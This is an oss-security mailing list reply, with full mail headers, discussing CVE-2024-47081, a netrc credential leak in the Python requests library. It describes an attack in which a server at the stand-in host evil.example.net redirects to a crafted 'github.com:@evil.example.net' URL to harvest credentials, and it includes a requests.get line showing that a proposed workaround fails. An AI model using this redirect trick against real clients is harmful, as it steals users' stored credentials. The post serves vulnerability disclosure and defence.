Received: (qmail 5182 invoked by uid 550); 4 Jun 2025 17:18:25 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 5160 invoked from network); 4 Jun 2025 17:18:25 -0000
Authentication-Results:garm.ovh; auth=pass (GARM-96R00198352910-d210-4c4f-8cb8-6564fc1108f4,
                    DE058819F46791C8E511B4CB74D75D7C0DB5803B) smtp.auth=jwilk@jwilk.net
X-OVh-ClientIp:37.248.225.17
Date: Wed, 4 Jun 2025 19:18:12 +0200
From: Jakub Wilk <jwilk@jwilk.net>
To: oss-security@lists.openwall.com
Message-ID: <20250604171812.y354hq4gte6omh7e@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <vXnhIIDfNauWIt5MizRQzyPhX--T3oCrKfPV4ixDc2J1W9iwF3zUR7g-9q1zz966EbG6Nf3Q5EX37ezTHJR_HgHXshROjRfXLDWl1AEInXA=@protonmail.ch>
 <e93b9bb3-c2ac-4640-bd23-8b7d2ba1b3f8@oracle.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <e93b9bb3-c2ac-4640-bd23-8b7d2ba1b3f8@oracle.com>
X-Ovh-Tracer-Id: 9211831564504870097
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgeeffedrtddugddvgeegucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecuhedttdenucenucfjughrpeffhffvuffkfhggtggugfgjsehtkeertddttdejnecuhfhrohhmpeflrghkuhgsucghihhlkhcuoehjfihilhhksehjfihilhhkrdhnvghtqeenucggtffrrghtthgvrhhnpedvtdfgtdeggfeltedugedtlefffedvjedtffelveejteffhfelledtgeffueffvdenucffohhmrghinhepvgigrghmphhlvgdrnhgvthdpghhithhhuhgsrdgtohhmnecukfhppeduvdejrddtrddtrddupdefjedrvdegkedrvddvhedrudejnecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehinhgvthepuddvjedrtddrtddruddpmhgrihhlfhhrohhmpehjfihilhhksehjfihilhhkrdhnvghtpdhnsggprhgtphhtthhopedupdhrtghpthhtohepohhsshdqshgvtghurhhithihsehlihhsthhsrdhophgvnhifrghllhdrtghomhdpoffvtefjohhsthepmhhoheefgegmpdhmohguvgepshhmthhpohhuth
DKIM-Signature: a=rsa-sha256; bh=xAVcya2Uobr2DzZfsESo35g14Se8arOiH60RC0ac+h4=;
 c=relaxed/relaxed; d=jwilk.net; h=From; s=ovhmo917968-selector1;
 t=1749057496; v=1;
 b=EcZqoFr8srvgtRTONstbW99851DcLwuTIEQy/t0iYwva4b5Pny8UiWZ5fBnD+EkRUkuE6f3w
 kVOQoSpiQ/4jOjGxk30kX3BsNfo2eOZ8upQkITwjQVCR3CT9mh7kD6k5Ahk3vp+wfjPicmpn2aJ
 fEWD1NS39p95GOhf9PTVM+Non6xeKTMqLSR8ugPfsRT1ywovYQRbSpL4BBv8BazQAHyIu0aFr6f
 4bfbPYmxV6hBRJmAz6yZ6rPHzJZO8VUSUBAw3mGsEW+zVG3fj9uQrxOi9Y9bR0MQVRlcTZ7hfsd
 KqRLbYZpWdpqdAHWIvAa38W0jOEPBr/cvbikmsAJ/6QLA==
Subject: Re: [oss-security] CVE-2024-47081: Netrc credential leak in PSF
 requests library

* Alan Coopersmith <alan.coopersmith@oracle.com>, 2025-06-03 10:09:
>I'm not sure how the attacker is supposed to get the victim to make a 
>requests call using a URL the attacker controls

The attacker could set a public HTTP server at 
<http://evil.example.net/> that redirects (via HTTP 302) everything to, 
say, <http://github.com:@evil.example.net>. Then they would only need to 
wait patiently for a visit from a robot that has requests under the 
hood.


* Juho Forsén, 2025-05-31 06:30:
>As a workaround, clients may explicitly specify the credentials used on 
>every API call to disable .netrc access.

I'm not aware of any good way to disable netrc support in requests:
https://github.com/requests/requests/issues/2773

In particular, AFAICT something like 

     requests.get("http://evil.example.net/", auth=("", ""))

(that was alluded by Juho) doesn't help in the presence of redirects. 
The redirected URL would still be fetched with netrc auth.

-- 
Jakub Wilk
